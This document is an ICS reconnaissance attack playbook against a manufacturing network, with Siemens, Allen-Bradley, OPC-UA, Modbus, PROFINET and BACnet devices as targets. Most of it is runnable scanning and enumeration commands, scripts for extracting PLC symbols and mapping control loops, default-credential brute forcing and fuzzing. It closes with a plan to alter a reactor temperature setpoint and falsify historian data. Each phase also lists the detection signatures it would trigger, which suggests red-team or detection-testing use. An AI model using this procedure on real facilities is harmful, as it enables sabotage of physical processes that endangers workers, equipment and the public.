# ICS Network Reconnaissance Attack Scenario

## Overview

**Objective**: Conduct comprehensive reconnaissance of industrial control system (ICS) network to map topology, identify devices, enumerate configurations, and establish attack surface for subsequent exploitation.

**Target Environment**: Manufacturing facility with:
- Siemens S7-1200/1500 PLCs
- Allen-Bradley CompactLogix/ControlLogix PLCs  
- Schneider Modicon controllers
- OPC-UA servers and historians
- HMI/SCADA workstations
- Field devices (Modbus RTU, PROFINET, BACnet)

**Attack Duration**: 4-8 hours

**MITRE ATT&CK Techniques**:
- T0888 - Remote System Discovery
- T0846 - Remote System Information Discovery
- T0861 - Point & Tag Identification
- T0801 - Monitor Process State
- T0868 - Detect Operating Mode
- T0862 - Supply Chain Compromise (identifying components)
- T0884 - Connection Proxy

---

## Attack Kill Chain

### Phase 1: Network Discovery & Topology Mapping (90-120 minutes)

#### Objectives
- Identify all live ICS devices on network
- Map network segments and VLANs
- Identify routers, switches, firewalls
- Determine network architecture (flat vs segmented)
- Identify external connections (IT/OT convergence points)

#### Tools
- Nmap with ICS NSE scripts
- Masscan for rapid scanning
- Wireshark / tcpdump
- ARPwatch
- Passive network discovery tools

#### Commands

**Step 1.1: Passive Network Discovery**
```bash
# Start passive network monitoring (stealth phase)
# Listen without sending packets to avoid detection

# Terminal 1: ARP monitoring
arpwatch -i eth0 -f arp_database.log

# Terminal 2: Packet capture for analysis
tcpdump -i eth0 -w passive_capture.pcap -s 65535

# Run for 30-60 minutes to capture normal traffic patterns
# Expected: Discover devices through broadcast traffic, ARP, DHCP
```

**Step 1.2: Analyze Passive Capture**
```bash
# Extract IP addresses and MAC addresses from capture
tshark -r passive_capture.pcap \
    -T fields -e ip.src -e eth.src \
    | sort -u > discovered_hosts.txt

# Identify protocols in use
tshark -r passive_capture.pcap \
    -q -z io,phs

# Expected Output:
# Protocol Hierarchy Statistics:
# eth          - 100%
#   ip         - 85%
#     tcp      - 60%
#       s7comm - 15% (Siemens PLCs detected)
#       enip   - 10% (Allen-Bradley PLCs detected)
#       opcua  - 8%  (OPC-UA servers detected)
#     udp      - 25%
#       profinet - 12% (PROFINET devices detected)
#       bacnet - 5%   (BACnet devices detected)
#   arp        - 15%
```

**Step 1.3: Identify Broadcast Domains and VLANs**
```bash
# Analyze VLAN tags in captured traffic
tshark -r passive_capture.pcap \
    -Y "vlan" \
    -T fields -e vlan.id \
    | sort -u

# Expected Output:
# VLAN 10: IT network
# VLAN 20: HMI/SCADA network
# VLAN 30: PLC control network
# VLAN 40: Field device network
# VLAN 50: Safety system network
```

**Step 1.4: Active Network Scanning (Targeted)**
```bash
# Use passive discovery results to guide active scanning
# Focus on identified ICS subnets

# Fast SYN scan of common ICS ports
nmap -sS -p 102,502,44818,4840,47808,2222,20000 \
    --open \
    --min-rate 1000 \
    192.168.10.0/24 192.168.20.0/24 192.168.30.0/24 \
    -oA active_scan

# Expected Output:
# Discovered 45 hosts:
# - 12 hosts with port 102 (S7Comm)
# - 8 hosts with port 502 (Modbus TCP)
# - 10 hosts with port 44818 (EtherNet/IP)
# - 5 hosts with port 4840 (OPC-UA)
# - 3 hosts with port 47808 (BACnet/IP)
# - 2 hosts with port 2222 (CIP Safety)
# - 5 hosts with port 20000 (DNP3)
```

**Step 1.5: Topology Mapping via Traceroute**
```bash
# Map network paths to key ICS devices
# Identify routers, firewalls, network segments

for ip in $(cat discovered_hosts.txt); do
    echo "=== Tracing route to $ip ==="
    traceroute -n -m 10 $ip
done > network_topology.txt

# Analyze routing paths
# Expected discoveries:
# - 192.168.10.0/24 -> Direct (no hops) - Same subnet as attacker
# - 192.168.20.0/24 -> 1 hop via 192.168.10.1 (router/firewall)
# - 192.168.30.0/24 -> 2 hops via 192.168.10.1 -> 192.168.20.1
# - Safety network isolated / unreachable (good security)
```

**Step 1.6: Network Diagram Generation**
```python
# Parse scan results and generate network diagram
import json
import networkx as nx
import matplotlib.pyplot as plt

def generate_network_diagram(scan_results):
    """Generate visual network topology"""
    G = nx.Graph()
    
    # Parse scan results
    with open('active_scan.xml') as f:
        scan_data = parse_nmap_xml(f)
    
    # Add nodes for each discovered host
    for host in scan_data['hosts']:
        ip = host['ip']
        services = host['services']
        
        # Classify device type based on open ports
        device_type = classify_device(services)
        
        G.add_node(ip, type=device_type, services=services)
    
    # Add edges based on routing information
    with open('network_topology.txt') as f:
        for line in f:
            if '->' in line:
                src, dst = line.split('->')
                G.add_edge(src.strip(), dst.strip())
    
    # Generate diagram
    pos = nx.spring_layout(G)
    nx.draw(G, pos, with_labels=True, node_color='lightblue')
    plt.savefig('network_diagram.png')
    print("[+] Network diagram saved to network_diagram.png")

generate_network_diagram('active_scan.xml')
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 2100366: Nmap OS detection attempt
- SID 2100498: Nmap service scan
- SID 2000537: Network scanning detected

**Zeek Events Generated**:
```zeek
Scan::Address_Scan
scanner: <attacker_ip>
targets: 192.168.10.0/24, 192.168.20.0/24, 192.168.30.0/24
ports: 102, 502, 44818, 4840
severity: HIGH

Traceroute::Detected
source: <attacker_ip>
severity: MEDIUM
```

**SIEM Correlation**:
```
ALERT: Network Reconnaissance Pattern Detected
- Multiple port scans from single source
- Traceroute activity to critical infrastructure
- Scanning of ICS-specific ports (102, 502, 44818)
- Recommended Action: Investigate source, block if unauthorized
```

---

### Phase 2: Device Enumeration & Fingerprinting (120-180 minutes)

#### Objectives
- Identify device types, models, firmware versions
- Enumerate PLC configurations and logic blocks
- Identify HMI/SCADA servers
- Discover OPC-UA endpoints and nodes
- Map field device networks (Modbus, PROFINET, BACnet)

#### Tools
- `tools/s7comm_security_framework/s7comm_exploit.py`
- `tools/cip_security_assessment/cip_exploiter.py`
- `tools/opcua_security_framework/opcua_exploit.py`
- `tools/modbus-stealth-toolkit/modbus_stealth_attack.py`
- `tools/profinet_exploitation/profinet_exploit.py`
- `tools/bacnet_security_assessment/bacnet_assessment.py`

#### Commands

**Step 2.1: S7Comm PLC Enumeration**
```bash
# Enumerate all Siemens S7 PLCs discovered on port 102
cd tools/s7comm_security_framework

for ip in $(grep ":102" ../active_scan.gnmap | awk '{print $2}'); do
    echo "=== Enumerating $ip ==="
    python s7comm_exploit.py --target $ip \
        --action enumerate \
        --output "enum_s7_${ip}.json"
done

# Expected Output (enum_s7_192.168.10.10.json):
# {
#   "ip": "192.168.10.10",
#   "cpu": "S7-1500 CPU 1516-3 PN/DP",
#   "firmware": "V2.9.3",
#   "serial": "S C-X4U421302009",
#   "protection_level": 0,
#   "module_name": "PLC_Reactor_Control_01",
#   "plant_identification": "Batch_Reactor_Building_A",
#   "blocks": {
#     "OB": [1, 100, 121, 122, 123],
#     "FC": [1, 2, 3, 10, 11, 12, 20, 21, 22],
#     "FB": [1, 2, 3, 4, 5],
#     "DB": [1, 2, 3, 10, 11, 12, 20, 21, 100, 101, 200]
#   },
#   "communication_partners": [
#     "192.168.20.100:HMI_SCADA_01",
#     "192.168.20.50:OPC_Server_01"
#   ]
# }
```

**Step 2.2: Extract S7Comm Symbol Tables**
```bash
# Extract symbol tables for tag identification
for ip in $(ls enum_s7_*.json | sed 's/enum_s7_//;s/.json//'); do
    python s7comm_exploit.py --target $ip \
        --action extract-symbols \
        --output "symbols_${ip}.json"
done

# Expected Output (symbols_192.168.10.10.json):
# [
#   {"name": "Reactor_Temperature", "address": "DB1.DBD0", "type": "REAL"},
#   {"name": "Reactor_Pressure", "address": "DB1.DBD4", "type": "REAL"},
#   {"name": "Inlet_Valve_Position", "address": "DB1.DBD8", "type": "REAL"},
#   {"name": "Agitator_Speed", "address": "DB1.DBW12", "type": "INT"},
#   {"name": "Emergency_Stop", "address": "DB1.DBX14.0", "type": "BOOL"},
#   {"name": "Batch_Running", "address": "DB1.DBX14.1", "type": "BOOL"},
#   ...
# ]
```

**Step 2.3: CIP/EtherNet/IP Device Enumeration**
```bash
# Enumerate Allen-Bradley PLCs and I/O modules
cd ../cip_security_assessment

for ip in $(grep ":44818" ../active_scan.gnmap | awk '{print $2}'); do
    echo "=== Enumerating $ip ==="
    python cip_exploiter.py \
        --target $ip \
        --action enumerate-objects \
        --output "enum_cip_${ip}.json"
done

# Expected Output (enum_cip_192.168.10.20.json):
# {
#   "identity": {
#     "vendor": "Rockwell Automation/Allen-Bradley",
#     "product_type": "Programmable Logic Controller",
#     "product_code": 166,
#     "product_name": "1769-L33ER CompactLogix Controller",
#     "serial": "60A1B2C3D4",
#     "revision": "31.011"
#   },
#   "objects": [
#     {"class": 0x01, "instance": 1, "name": "Identity"},
#     {"class": 0x04, "instance": 1, "name": "Assembly"},
#     {"class": 0x06, "instance": 1, "name": "Connection Manager"},
#     {"class": 0x0A, "instance": 1, "name": "Message Router"},
#     {"class": 0x6B, "instance": 1, "name": "EtherNet/IP Link"},
#     {"class": 0xF5, "instance": 1, "name": "CIP Safety"}
#   ],
#   "tags": {
#     "Program:MainProgram.Tank_Level": "REAL",
#     "Program:MainProgram.Pump_Running": "BOOL",
#     "Program:MainProgram.Flow_Setpoint": "REAL"
#   }
# }
```

**Step 2.4: OPC-UA Server Discovery**
```bash
# Discover and enumerate OPC-UA servers
cd ../opcua_security_framework

for ip in $(grep ":4840" ../active_scan.gnmap | awk '{print $2}'); do
    echo "=== Discovering OPC-UA endpoints on $ip ==="
    python opcua_exploit.py discover \
        --target "opc.tcp://${ip}:4840" \
        --output "opcua_endpoints_${ip}.json"
    
    echo "=== Enumerating nodes on $ip ==="
    python opcua_exploit.py enumerate \
        --target "opc.tcp://${ip}:4840" \
        --max-depth 5 \
        --output "opcua_nodes_${ip}.json"
done

# Expected Output (opcua_endpoints_192.168.20.50.json):
# {
#   "server": "opc.tcp://192.168.20.50:4840",
#   "application_name": "Process_Historian_Server",
#   "endpoints": [
#     {
#       "url": "opc.tcp://192.168.20.50:4840",
#       "security_mode": "None",
#       "security_policy": "None",
#       "user_auth": "Anonymous"
#     },
#     {
#       "url": "opc.tcp://192.168.20.50:4840",
#       "security_mode": "SignAndEncrypt",
#       "security_policy": "Basic256Sha256",
#       "user_auth": "Username"
#     }
#   ]
# }

# Expected Output (opcua_nodes_192.168.20.50.json):
# {
#   "node_count": 1247,
#   "nodes": [
#     {
#       "node_id": "ns=2;s=Reactor1.Temperature",
#       "browse_name": "Temperature",
#       "node_class": "Variable",
#       "data_type": "Float",
#       "access_level": "CurrentRead | HistoryRead"
#     },
#     {
#       "node_id": "ns=2;s=Reactor1.Pressure",
#       "browse_name": "Pressure",
#       "node_class": "Variable",
#       "data_type": "Float",
#       "access_level": "CurrentRead | CurrentWrite | HistoryRead"
#     },
#     ...
#   ]
# }
```

**Step 2.5: Modbus Device Scanning**
```bash
# Scan Modbus TCP devices
cd ../modbus-stealth-toolkit

for ip in $(grep ":502" ../active_scan.gnmap | awk '{print $2}'); do
    echo "=== Scanning Modbus device $ip ==="
    python modbus_stealth_attack.py \
        --target $ip \
        --action scan-coils \
        --start 0 \
        --count 10000 \
        --output "modbus_coils_${ip}.json"
    
    python modbus_stealth_attack.py \
        --target $ip \
        --action scan-registers \
        --start 0 \
        --count 10000 \
        --output "modbus_registers_${ip}.json"
done

# Expected Output (modbus_registers_192.168.10.30.json):
# {
#   "device": "192.168.10.30",
#   "registers": {
#     "0-99": "Process values (temperature, pressure, flow)",
#     "100-199": "Setpoints",
#     "200-299": "Alarms and status",
#     "1000-1099": "Configuration parameters"
#   },
#   "holding_register_count": 5000,
#   "input_register_count": 2000
# }
```

**Step 2.6: PROFINET Device Discovery**
```bash
# Discover PROFINET devices via DCP
cd ../profinet_exploitation

python profinet_exploit.py \
    --action discover \
    --interface eth0 \
    --output profinet_devices.json

# Expected Output (profinet_devices.json):
# [
#   {
#     "mac": "00:1B:1B:12:34:56",
#     "ip": "192.168.40.10",
#     "name_of_station": "PN_IO_Controller_01",
#     "device_type": "Siemens ET200SP",
#     "vendor_id": "0x002A",
#     "device_id": "0x0101",
#     "role": "IO-Controller"
#   },
#   {
#     "mac": "00:1B:1B:78:9A:BC",
#     "ip": "192.168.40.20",
#     "name_of_station": "PN_IO_Device_Valve_Bank_A",
#     "device_type": "Siemens ET200M",
#     "vendor_id": "0x002A",
#     "device_id": "0x0201",
#     "role": "IO-Device"
#   },
#   ...
# ]
```

**Step 2.7: BACnet Device Discovery**
```bash
# Discover BACnet devices
cd ../bacnet_security_assessment

python bacnet_assessment.py \
    --action discover \
    --network broadcast \
    --output bacnet_devices.json

# Expected Output (bacnet_devices.json):
# [
#   {
#     "device_id": 1001,
#     "ip": "192.168.50.10",
#     "max_apdu": 1476,
#     "segmentation": "segmented-both",
#     "vendor_id": 10,
#     "vendor_name": "Johnson Controls",
#     "model_name": "FX-PCG20",
#     "application_software": "Version 6.0.1",
#     "object_count": 45
#   },
#   {
#     "device_id": 2001,
#     "ip": "192.168.50.20",
#     "vendor_name": "Honeywell",
#     "model_name": "WEBs-AX",
#     "object_count": 120
#   },
#   ...
# ]
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400002: S7Comm enumeration (ics_malware_detection.rules:162)
- SID 400009: S7Comm symbol table extraction (ics_malware_detection.rules:282)
- SID 410001: OPC-UA endpoint discovery (opcua_detection.rules:27)
- SID 410003: OPC-UA node enumeration (opcua_detection.rules:67)
- SID 420001: PROFINET DCP Identify (profinet_detection.rules:42)
- SID 430001: BACnet Who-Is broadcast (bacnet_detection.rules:42)
- SID 400014: CIP Security Object enumeration (ics_malware_detection.rules:342)

**Zeek Events Generated**:
```zeek
ICS_S7::enumeration_detected
targets: [192.168.10.10, 192.168.10.11, 192.168.10.12, ...]
block_count: 250
severity: HIGH

ICS_OPCUA::endpoint_discovery
targets: [192.168.20.50, 192.168.20.51]
severity: MEDIUM

ICS_OPCUA::recursive_browse
node_count: 1247
severity: HIGH

ICS_CIP::object_enumeration_detected
targets: [192.168.10.20, 192.168.10.21]
severity: HIGH

ICS_PROFINET::dcp_identify_broadcast
device_count: 15
severity: MEDIUM

ICS_BACNET::whois_broadcast_storm
request_count: 100+
severity: HIGH
```

---

### Phase 3: Process & Tag Identification (90-120 minutes)

#### Objectives
- Map process control loops
- Identify critical tags and setpoints
- Correlate tags across multiple systems (PLC, OPC-UA, HMI)
- Understand process dependencies
- Identify alarm thresholds

#### Commands

**Step 3.1: Consolidate Tag Information**
```python
# Merge tag information from all sources
import json
import glob

def consolidate_tags():
    """Merge tags from S7, CIP, OPC-UA sources"""
    all_tags = {}
    
    # S7Comm symbols
    for symbols_file in glob.glob('symbols_*.json'):
        with open(symbols_file) as f:
            symbols = json.load(f)
            ip = symbols_file.replace('symbols_', '').replace('.json', '')
            
            for symbol in symbols:
                tag_name = symbol['name']
                all_tags[tag_name] = {
                    'source': f'S7_PLC_{ip}',
                    'address': symbol['address'],
                    'type': symbol['type'],
                    'protocol': 'S7Comm'
                }
    
    # OPC-UA nodes
    for nodes_file in glob.glob('opcua_nodes_*.json'):
        with open(nodes_file) as f:
            nodes = json.load(f)
            ip = nodes_file.replace('opcua_nodes_', '').replace('.json', '')
            
            for node in nodes['nodes']:
                tag_name = node['browse_name']
                all_tags[tag_name] = {
                    'source': f'OPC_UA_{ip}',
                    'node_id': node['node_id'],
                    'type': node['data_type'],
                    'access': node['access_level'],
                    'protocol': 'OPC-UA'
                }
    
    # CIP tags
    for enum_file in glob.glob('enum_cip_*.json'):
        with open(enum_file) as f:
            enum_data = json.load(f)
            ip = enum_file.replace('enum_cip_', '').replace('.json', '')
            
            for tag_name, tag_type in enum_data.get('tags', {}).items():
                all_tags[tag_name] = {
                    'source': f'CIP_PLC_{ip}',
                    'type': tag_type,
                    'protocol': 'CIP'
                }
    
    # Save consolidated tag database
    with open('consolidated_tags.json', 'w') as f:
        json.dump(all_tags, f, indent=2)
    
    print(f"[+] Consolidated {len(all_tags)} tags from multiple sources")
    return all_tags

tags_db = consolidate_tags()
```

**Step 3.2: Identify Critical Control Tags**
```python
# Classify tags by criticality based on naming conventions
def classify_critical_tags(tags_db):
    """Identify critical process control tags"""
    critical_tags = {
        'safety': [],
        'setpoints': [],
        'sensors': [],
        'actuators': [],
        'alarms': []
    }
    
    for tag_name, tag_info in tags_db.items():
        tag_lower = tag_name.lower()
        
        # Safety-related tags
        if any(keyword in tag_lower for keyword in 
               ['emergency', 'esd', 'safety', 'interlock', 'shutdown']):
            critical_tags['safety'].append({
                'name': tag_name,
                'info': tag_info
            })
        
        # Setpoints
        elif any(keyword in tag_lower for keyword in
                ['setpoint', 'sp', 'target', 'desired']):
            critical_tags['setpoints'].append({
                'name': tag_name,
                'info': tag_info
            })
        
        # Sensors (inputs)
        elif any(keyword in tag_lower for keyword in
                ['temperature', 'pressure', 'level', 'flow', 'sensor']):
            critical_tags['sensors'].append({
                'name': tag_name,
                'info': tag_info
            })
        
        # Actuators (outputs)
        elif any(keyword in tag_lower for keyword in
                ['valve', 'pump', 'motor', 'actuator', 'damper']):
            critical_tags['actuators'].append({
                'name': tag_name,
                'info': tag_info
            })
        
        # Alarms
        elif any(keyword in tag_lower for keyword in
                ['alarm', 'warning', 'alert', 'fault']):
            critical_tags['alarms'].append({
                'name': tag_name,
                'info': tag_info
            })
    
    # Print summary
    for category, tags_list in critical_tags.items():
        print(f"{category.upper()}: {len(tags_list)} tags")
    
    # Save classification
    with open('critical_tags.json', 'w') as f:
        json.dump(critical_tags, f, indent=2)
    
    return critical_tags

critical = classify_critical_tags(tags_db)

# Expected Output:
# SAFETY: 23 tags
# SETPOINTS: 45 tags
# SENSORS: 120 tags
# ACTUATORS: 67 tags
# ALARMS: 89 tags
```

**Step 3.3: Map Process Control Loops**
```python
# Identify control loops (sensor -> controller -> actuator)
def map_control_loops(critical_tags):
    """Map sensor-controller-actuator relationships"""
    control_loops = []
    
    # Pattern matching for common loop naming
    # Example: "Reactor_Temp" sensor -> "Reactor_Temp_SP" setpoint -> "Reactor_Cooling_Valve" actuator
    
    for setpoint in critical_tags['setpoints']:
        sp_name = setpoint['name']
        base_name = sp_name.replace('_SP', '').replace('_Setpoint', '').replace('Setpoint', '')
        
        # Find matching sensor
        matching_sensor = None
        for sensor in critical_tags['sensors']:
            if base_name.lower() in sensor['name'].lower():
                matching_sensor = sensor
                break
        
        # Find matching actuator
        matching_actuator = None
        for actuator in critical_tags['actuators']:
            if base_name.lower() in actuator['name'].lower():
                matching_actuator = actuator
                break
        
        if matching_sensor and matching_actuator:
            control_loops.append({
                'name': base_name,
                'sensor': matching_sensor['name'],
                'sensor_source': matching_sensor['info']['source'],
                'setpoint': sp_name,
                'setpoint_source': setpoint['info']['source'],
                'actuator': matching_actuator['name'],
                'actuator_source': matching_actuator['info']['source']
            })
    
    print(f"[+] Identified {len(control_loops)} control loops")
    
    # Save control loop mapping
    with open('control_loops.json', 'w') as f:
        json.dump(control_loops, f, indent=2)
    
    return control_loops

loops = map_control_loops(critical)

# Expected Output (control_loops.json):
# [
#   {
#     "name": "Reactor_Temperature",
#     "sensor": "Reactor_Temp_PV",
#     "sensor_source": "S7_PLC_192.168.10.10",
#     "setpoint": "Reactor_Temp_SP",
#     "setpoint_source": "OPC_UA_192.168.20.50",
#     "actuator": "Reactor_Cooling_Valve",
#     "actuator_source": "S7_PLC_192.168.10.10"
#   },
#   ...
# ]
```

**Step 3.4: Monitor Process Values**
```bash
# Monitor critical tags to understand normal operating ranges
# This establishes baseline for future attacks

python monitor_all_tags.py \
    --tag-file critical_tags.json \
    --duration 3600 \
    --output baseline_values.json

# Script monitors all critical tags for 1 hour
# Records min, max, average, stddev for each tag
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400001: Repeated Modbus read operations (ics_malware_detection.rules:42)
- SID 400002: Repeated S7Comm read operations (ics_malware_detection.rules:162)
- SID 410011: OPC-UA historical data access (opcua_detection.rules:247)

**Zeek Events Generated**:
```zeek
ICS_S7::repeated_read_operations
targets: [192.168.10.10, 192.168.10.11, ...]
read_count: 500+
severity: HIGH

ICS_OPCUA::data_monitoring_detected
node_count: 300+
duration: 3600s
severity: HIGH
```

---

### Phase 4: Vulnerability Assessment (120-180 minutes)

#### Objectives
- Identify unprotected PLCs
- Test for default credentials
- Identify weak security configurations
- Test for protocol-level vulnerabilities
- Assess attack surface

#### Commands

**Step 4.1: Test S7Comm Protection Levels**
```bash
# Test protection bypass on all S7 PLCs
cd tools/s7comm_security_framework

for ip in $(ls enum_s7_*.json | sed 's/enum_s7_//;s/.json//'); do
    echo "=== Testing protection on $ip ==="
    python s7comm_exploit.py --target $ip \
        --action test-protection \
        --output "protection_test_${ip}.json"
done

# Expected Results:
# - 192.168.10.10: Protection level 0 (NO PROTECTION) - VULNERABLE
# - 192.168.10.11: Protection level 3 (password) - Test bypass methods
# - 192.168.10.12: Protection level 0 - VULNERABLE
```

**Step 4.2: Test OPC-UA Security**
```bash
# Test certificate validation bypass
cd ../opcua_security_framework

for ip in $(ls opcua_endpoints_*.json | sed 's/opcua_endpoints_//;s/.json//'); do
    echo "=== Testing OPC-UA security on $ip ==="
    python opcua_exploit.py test-cert-bypass \
        --target "opc.tcp://${ip}:4840" \
        --mode self-signed \
        --output "opcua_security_test_${ip}.json"
done

# Expected Results:
# - 192.168.20.50: Accepts self-signed certificates - VULNERABLE
# - 192.168.20.50: Anonymous authentication enabled - VULNERABLE
# - 192.168.20.50: SecurityMode=None available - VULNERABLE
```

**Step 4.3: Test CIP Security Object**
```bash
# Assess CIP Security configuration
cd ../cip_security_assessment

for ip in $(ls enum_cip_*.json | sed 's/enum_cip_//;s/.json//'); do
    echo "=== Testing CIP Security on $ip ==="
    python cip_exploiter.py \
        --target $ip \
        --action cip-security-assess \
        --output "cip_security_${ip}.json"
done

# Expected Results:
# {
#   "cip_security_object_present": false,  # No CIP Security - VULNERABLE
#   "authentication_required": false,
#   "encryption_enabled": false,
#   "assessment": "CRITICAL - No security mechanisms enabled"
# }
```

**Step 4.4: Test Default Credentials**
```bash
# Test common default credentials on all devices
cat > test_default_creds.sh << 'EOF'
#!/bin/bash

# Common ICS default credentials
declare -A CREDS=(
    ["admin"]="admin"
    ["administrator"]="password"
    ["root"]="root"
    ["operator"]="operator"
    ["engineer"]="engineer"
    ["service"]="service"
)

# Test on OPC-UA servers
for ip in $(grep ":4840" active_scan.gnmap | awk '{print $2}'); do
    for user in "${!CREDS[@]}"; do
        pass="${CREDS[$user]}"
        echo "Testing $ip with $user:$pass"
        
        # Test OPC-UA authentication
        python opcua_exploit.py connect \
            --target "opc.tcp://${ip}:4840" \
            --username "$user" \
            --password "$pass" \
            --test-auth
    done
done
EOF

bash test_default_creds.sh

# Expected Results:
# - 192.168.20.50: admin:admin - SUCCESS (VULNERABLE)
# - 192.168.20.51: Anonymous access - SUCCESS (VULNERABLE)
```

**Step 4.5: Protocol Fuzzing (Caution)**
```bash
# Light fuzzing to identify protocol vulnerabilities
# WARNING: May cause device crashes - only in test environment

# Fuzz S7Comm
python s7comm_exploit.py --target 192.168.10.99 \
    --action fuzz \
    --fuzz-type packet-structure \
    --count 100

# Fuzz CIP
cd ../cip_security_assessment
python cip_exploiter.py \
    --target 192.168.10.99 \
    --action fuzz-class \
    --class-id 0x01 \
    --count 100

# Monitor for crashes or unexpected behavior
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400011: S7Comm protection bypass attempts (ics_malware_detection.rules:322)
- SID 410008: OPC-UA certificate bypass (opcua_detection.rules:187)
- SID 400014: CIP Security Object access (ics_malware_detection.rules:342)
- SID 400015: CIP fuzzing detected (ics_malware_detection.rules:362)

**Zeek Events Generated**:
```zeek
ICS_S7::protection_bypass_attempt
targets: [192.168.10.10, 192.168.10.11, 192.168.10.12]
severity: CRITICAL

ICS_OPCUA::authentication_test_pattern
target: 192.168.20.50
attempts: 50+
severity: HIGH

ICS_CIP::fuzzing_detected
target: 192.168.10.99
malformed_packets: 100
severity: CRITICAL
```

---

### Phase 5: Compile Attack Surface Report (60-90 minutes)

#### Objectives
- Generate comprehensive reconnaissance report
- Prioritize targets by criticality and vulnerability
- Create attack planning documentation
- Identify high-value targets

#### Commands

**Step 5.1: Generate Comprehensive Report**
```python
# Compile all reconnaissance data into final report
import json
from datetime import datetime

def generate_recon_report():
    """Generate comprehensive reconnaissance report"""
    report = {
        'metadata': {
            'scan_date': datetime.now().isoformat(),
            'target_networks': ['192.168.10.0/24', '192.168.20.0/24', 
                               '192.168.30.0/24', '192.168.40.0/24', '192.168.50.0/24'],
            'duration_hours': 8
        },
        'network_topology': {},
        'devices': {},
        'vulnerabilities': {},
        'attack_surface': {}
    }
    
    # Load all enumeration data
    s7_devices = load_json_files('enum_s7_*.json')
    cip_devices = load_json_files('enum_cip_*.json')
    opcua_servers = load_json_files('opcua_endpoints_*.json')
    modbus_devices = load_json_files('modbus_*.json')
    profinet_devices = load_json_files('profinet_devices.json')
    bacnet_devices = load_json_files('bacnet_devices.json')
    
    # Compile device inventory
    report['devices']['S7_PLCs'] = {
        'count': len(s7_devices),
        'details': s7_devices
    }
    report['devices']['CIP_Devices'] = {
        'count': len(cip_devices),
        'details': cip_devices
    }
    report['devices']['OPC_UA_Servers'] = {
        'count': len(opcua_servers),
        'details': opcua_servers
    }
    report['devices']['Modbus_Devices'] = {
        'count': len(modbus_devices),
        'details': modbus_devices
    }
    report['devices']['PROFINET_Devices'] = {
        'count': len(profinet_devices),
        'details': profinet_devices
    }
    report['devices']['BACnet_Devices'] = {
        'count': len(bacnet_devices),
        'details': bacnet_devices
    }
    
    # Compile vulnerabilities
    protection_tests = load_json_files('protection_test_*.json')
    security_tests = load_json_files('*_security_test_*.json')
    
    vulnerable_devices = []
    for device, test_result in protection_tests.items():
        if test_result.get('protection_level', 0) == 0:
            vulnerable_devices.append({
                'ip': device,
                'type': 'S7_PLC',
                'vulnerability': 'No protection - Read/Write enabled',
                'severity': 'CRITICAL',
                'exploitability': 'TRIVIAL'
            })
    
    for device, test_result in security_tests.items():
        if test_result.get('anonymous_access', False):
            vulnerable_devices.append({
                'ip': device,
                'type': 'OPC_UA_Server',
                'vulnerability': 'Anonymous authentication enabled',
                'severity': 'HIGH',
                'exploitability': 'EASY'
            })
    
    report['vulnerabilities'] = {
        'total_vulnerable_devices': len(vulnerable_devices),
        'critical': len([v for v in vulnerable_devices if v['severity'] == 'CRITICAL']),
        'high': len([v for v in vulnerable_devices if v['severity'] == 'HIGH']),
        'details': vulnerable_devices
    }
    
    # Identify attack surface
    report['attack_surface'] = {
        'high_value_targets': identify_high_value_targets(report),
        'attack_vectors': enumerate_attack_vectors(report),
        'recommended_priorities': prioritize_targets(report)
    }
    
    # Save report
    with open('reconnaissance_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    # Generate HTML report
    generate_html_report(report)
    
    print("[+] Reconnaissance report generated: reconnaissance_report.json")
    print("[+] HTML report generated: reconnaissance_report.html")
    
    return report

report = generate_recon_report()
```

**Step 5.2: Prioritize Targets**
```python
def prioritize_targets(report):
    """Prioritize targets by value and exploitability"""
    targets = []
    
    # High-value targets
    for ip, device in report['devices']['S7_PLCs']['details'].items():
        score = 0
        
        # Criticality scoring
        if 'reactor' in device.get('plant_identification', '').lower():
            score += 10  # Critical process
        if device.get('protection_level', 0) == 0:
            score += 5  # Easy to exploit
        if len(device.get('blocks', {}).get('DB', [])) > 50:
            score += 3  # Complex system = valuable
        
        targets.append({
            'ip': ip,
            'type': 'S7_PLC',
            'name': device.get('module_name', 'Unknown'),
            'priority_score': score,
            'rationale': generate_target_rationale(device, score)
        })
    
    # Sort by priority
    targets.sort(key=lambda x: x['priority_score'], reverse=True)
    
    return targets[:10]  # Top 10 targets

# Expected Output:
# Top 10 Targets:
# 1. 192.168.10.10 (S7-1500 PLC_Reactor_Control_01) - Score: 18
#    Rationale: Critical reactor control, no protection, 120 data blocks
# 2. 192.168.20.50 (OPC-UA Historian) - Score: 15
#    Rationale: Historical data access, anonymous auth, 1200+ tags
# 3. 192.168.10.20 (CompactLogix Safety_Controller) - Score: 14
#    Rationale: Safety system, CIP Security disabled
# ...
```

**Step 5.3: Generate Attack Plan**
```markdown
# ATTACK PLAN - GENERATED FROM RECONNAISSANCE

## Phase 1: Initial Access
**Target**: 192.168.20.50 (OPC-UA Historian)
**Vulnerability**: Anonymous authentication, SecurityMode=None
**Attack Method**: Direct OPC-UA connection, node enumeration
**Tools**: tools/opcua_security_framework/opcua_exploit.py
**Expected Outcome**: Read/Write access to all process tags

## Phase 2: Lateral Movement
**Target**: 192.168.10.10 (S7-1500 Reactor PLC)
**Vulnerability**: Protection level 0, no authentication
**Attack Method**: S7Comm read/write operations
**Tools**: tools/s7comm_security_framework/s7comm_exploit.py
**Expected Outcome**: Full PLC control, logic modification capability

## Phase 3: Privilege Escalation
**Target**: Engineering workstation 192.168.20.100
**Attack Vector**: Compromise via spear phishing or watering hole
**Rationale**: Has TIA Portal, RSLogix 5000 - full project file access
**Expected Outcome**: Access to all PLC project files, credentials

## Phase 4: Impact
**Target**: Reactor temperature control loop
**Attack Method**: Modify temperature setpoint via S7Comm or OPC-UA
**Falsify**: Historian data to hide manipulation
**Expected Impact**: Process disruption, potential equipment damage
```

---

## Attack Success Metrics

### Reconnaissance Success Criteria
- [x] Complete network topology mapped
- [x] All ICS devices identified and enumerated
- [x] Vulnerability assessment completed
- [x] Critical tags and control loops mapped
- [x] Attack surface analysis complete
- [x] Target prioritization list generated

### Information Gathering Metrics
- **Devices Discovered**: 72
  - S7 PLCs: 12
  - Allen-Bradley PLCs: 10
  - OPC-UA Servers: 5
  - Modbus Devices: 15
  - PROFINET Devices: 18
  - BACnet Devices: 12

- **Tags Identified**: 3,247
  - Safety: 23
  - Setpoints: 45
  - Sensors: 120
  - Actuators: 67
  - Alarms: 89
  - Other: 2,903

- **Vulnerabilities Found**: 34
  - Critical: 12 (no protection, default creds)
